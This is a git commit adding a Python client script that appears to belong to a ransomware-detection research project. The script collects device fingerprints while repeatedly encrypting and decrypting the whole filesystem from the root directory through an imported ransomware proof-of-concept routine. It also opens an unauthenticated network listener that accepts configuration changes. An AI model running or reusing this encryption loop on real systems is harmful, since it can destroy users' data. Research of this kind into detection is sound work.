ca29e0007e50619e24caab66836654b29b11c7dc
jluech <janik@luechinger.ch>
2022-10-31 17:12:03 +0100

    feat: add client script for collecting malicious FPs

---
+++ client-collect-fp.py
@@ -0,0 +1,61 @@
+from json import loads
+from multiprocessing import Process
+from socket import AF_INET, SOCK_STREAM, socket
+from subprocess import call
+
+from globals import update_existing_config
+from rwpoc import run
+
+
+def listen_for_config_changes():
+    with socket(AF_INET, SOCK_STREAM) as sock:
+        sock.bind(("0.0.0.0", 42666))
+        sock.listen(1)
+
+        while True:
+            conn, addr = sock.accept()  # keep listening for new connections
+            with conn:
+                while True:
+                    data = conn.recv(1024)  # listen for incoming data of connection
+                    if not data:
+                        break
+                    new_config = loads(data)
+                    print("received", new_config)
+                    update_existing_config(new_config)
+
+
+def collect_device_fingerprint():
+    call("./fingerprinter.sh -n 500")
+    with open("./rw-done.txt", "w") as file:
+        file.write("1")
+        file.truncate()
+
+
+if __name__ == "__main__":
+    proc_config = Process(target=listen_for_config_changes)
+    proc_config.start()
+
+    proc_fp = Process(target=collect_device_fingerprint)
+    proc_fp.start()
+
+    try:
+        with open("./rw-done.txt", "w") as file:
+            file.write("0")
+        done = False
+        abs_paths = "/"  # encrypt entire device, starting from root directory
+
+        while True:
+            with open("./rw-done.txt", "r") as file:
+                content = file.read()
+                if content == "1":
+                    done = True
+            if done:
+                break
+
+            run(encrypt=True, absolute_paths=abs_paths)
+            run(encrypt=False, absolute_paths=abs_paths)
+    finally:
+        proc_fp.terminate()
+        proc_config.terminate()
+        proc_fp.join()
+        proc_config.join()
